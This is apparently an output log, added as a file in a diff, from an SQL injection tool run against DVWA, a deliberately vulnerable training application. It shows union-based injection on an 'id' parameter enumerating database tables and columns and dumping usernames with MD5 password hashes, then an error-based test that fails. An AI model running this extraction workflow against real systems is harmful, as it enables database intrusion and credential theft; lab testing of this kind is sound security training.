@@ -1,0 +1,244 @@
+--- STARTING UNION-BASED SQLI ---
+
+
+
+--- TESTING PARAMETER "id=1" ---
+
+
+
+Number of columns in SELECT statement of parameter "id=1": 2
+
+
+Column no. 1 seems to contain readable data... EXTRACTING TABLES
+
+Database name: dvwa
+
+Extracted tables from dvwa database:
+
+
+	ALL_PLUGINS
+	APPLICABLE_ROLES
+	CHARACTER_SETS
+	CHECK_CONSTRAINTS
+	COLLATIONS
+	COLLATION_CHARACTER_SET_APPLICABILITY
+	COLUMNS
+	COLUMN_PRIVILEGES
+	ENABLED_ROLES
+	ENGINES
+	EVENTS
+	FILES
+	GLOBAL_STATUS
+	GLOBAL_VARIABLES
+	KEY_CACHES
+	KEY_COLUMN_USAGE
+	OPTIMIZER_TRACE
+	PARAMETERS
+	PARTITIONS
+	PLUGINS
+	PROCESSLIST
+	PROFILING
+	REFERENTIAL_CONSTRAINTS
+	ROUTINES
+	SCHEMATA
+	SCHEMA_PRIVILEGES
+	SESSION_STATUS
+	SESSION_VARIABLES
+	STATISTICS
+	SYSTEM_VARIABLES
+	TABLES
+	TABLESPACES
+	TABLE_CONSTRAINTS
+	TABLE_PRIVILEGES
+	TRIGGERS
+	USER_PRIVILEGES
+	VIEWS
+	GEOMETRY_COLUMNS
+	SPATIAL_REF_SYS
+	CLIENT_STATISTICS
+	INDEX_STATISTICS
+	INNODB_SYS_DATAFILES
+	USER_STATISTICS
+	INNODB_SYS_TABLESTATS
+	INNODB_LOCKS
+	INNODB_MUTEXES
+	INNODB_CMPMEM
+	INNODB_CMP_PER_INDEX
+	INNODB_CMP
+	INNODB_FT_DELETED
+	INNODB_CMP_RESET
+	INNODB_LOCK_WAITS
+	TABLE_STATISTICS
+	INNODB_TABLESPACES_ENCRYPTION
+	INNODB_BUFFER_PAGE_LRU
+	INNODB_SYS_FIELDS
+	INNODB_CMPMEM_RESET
+	INNODB_SYS_COLUMNS
+	INNODB_FT_INDEX_TABLE
+	INNODB_CMP_PER_INDEX_RESET
+	user_variables
+	INNODB_FT_INDEX_CACHE
+	INNODB_SYS_FOREIGN_COLS
+	INNODB_FT_BEING_DELETED
+	INNODB_BUFFER_POOL_STATS
+	INNODB_TRX
+	INNODB_SYS_FOREIGN
+	INNODB_SYS_TABLES
+	INNODB_FT_DEFAULT_STOPWORD
+	INNODB_FT_CONFIG
+	INNODB_BUFFER_PAGE
+	INNODB_SYS_TABLESPACES
+	INNODB_METRICS
+	INNODB_SYS_INDEXES
+	INNODB_SYS_VIRTUAL
+	INNODB_TABLESPACES_SCRUBBING
+	INNODB_SYS_SEMAPHORE_WAITS
+	guestbook
+	users
+	columns_priv
+	column_stats
+	db
+	event
+	func
+	general_log
+	global_priv
+	gtid_slave_pos
+	help_category
+	help_keyword
+	help_relation
+	help_topic
+	index_stats
+	innodb_index_stats
+	innodb_table_stats
+	plugin
+	proc
+	procs_priv
+	proxies_priv
+	roles_mapping
+	servers
+	slow_log
+	tables_priv
+	table_stats
+	time_zone
+	time_zone_leap_second
+	time_zone_name
+	time_zone_transition
+	time_zone_transition_type
+	transaction_registry
+	user
+	cond_instances
+	events_waits_current
+	events_waits_history
+	events_waits_history_long
+	events_waits_summary_by_host_by_event_name
+	events_waits_summary_by_instance
+	events_waits_summary_by_thread_by_event_name
+	events_waits_summary_by_user_by_event_name
+	events_waits_summary_by_account_by_event_name
+	events_waits_summary_global_by_event_name
+	file_instances
+	file_summary_by_event_name
+	file_summary_by_instance
+	host_cache
+	mutex_instances
+	objects_summary_global_by_type
+	performance_timers
+	rwlock_instances
+	setup_actors
+	setup_consumers
+	setup_instruments
+	setup_objects
+	setup_timers
+	table_io_waits_summary_by_index_usage
+	table_io_waits_summary_by_table
+	table_lock_waits_summary_by_table
+	threads
+	events_stages_current
+	events_stages_history
+	events_stages_history_long
+	events_stages_summary_by_thread_by_event_name
+	events_stages_summary_by_account_by_event_name
+	events_stages_summary_by_user_by_event_name
+	events_stages_summary_by_host_by_event_name
+	events_stages_summary_global_by_event_name
+	events_statements_current
+	events_statements_history
+	events_statements_history_long
+	events_statements_summary_by_thread_by_event_name
+	events_statements_summary_by_account_by_event_name
+	events_statements_summary_by_user_by_event_name
+	events_statements_summary_by_host_by_event_name
+	events_statements_summary_global_by_event_name
+	events_statements_summary_by_digest
+	accounts
+	hosts
+	socket_instances
+	socket_summary_by_instance
+	socket_summary_by_event_name
+	session_connect_attrs
+	session_account_connect_attrs
+	pma__bookmark
+	pma__central_columns
+	pma__column_info
+	pma__designer_settings
+	pma__export_templates
+	pma__favorite
+	pma__history
+	pma__navigationhiding
+	pma__pdf_pages
+	pma__recent
+	pma__relation
+	pma__savedsearches
+	pma__table_coords
+	pma__table_info
+	pma__table_uiprefs
+	pma__tracking
+	pma__userconfig
+	pma__usergroups
+	pma__users
+
+Found 2 tables containing word "users":
+
+
+	---  "users"  ---
+	---  "pma__users"  ---
+
+
+Extracted columns from users.dvwa table:
+
+	user_id
+	first_name
+	last_name
+	user
+	password
+	avatar
+	last_login
+	failed_login
+	CURRENT_CONNECTIONS
+	TOTAL_CONNECTIONS
+
+Found 3 columns in users.dvwa, which possibly contain confidential data:
+
+	---  "user_id"  ---
+	---  "user"  ---
+	---  "password"  ---
+
+EXTRACTING USERNAMES AND PASSWORDS
+
+Username: admin    Password: 5f4dcc3b5aa765d61d8327deb882cf99
+Username: gordonb    Password: e99a18c428cb38d5f260853678922e03
+Username: 1337    Password: 8d3533d75ae2c3966d7e0d4fcc69216b
+Username: pablo    Password: 0d107d09f5bbe40cade3de5c71e9e9b7
+Username: smithy    Password: 5f4dcc3b5aa765d61d8327deb882cf99
+
+--- STARTING ERROR-BASED SQLI ---
+
+
+
+--- TESTING PARAMETER "id=1" ---
+
+
+
+URL Not Vulnerable to Error-Based SQLi, probably due to limited error messages
+
+
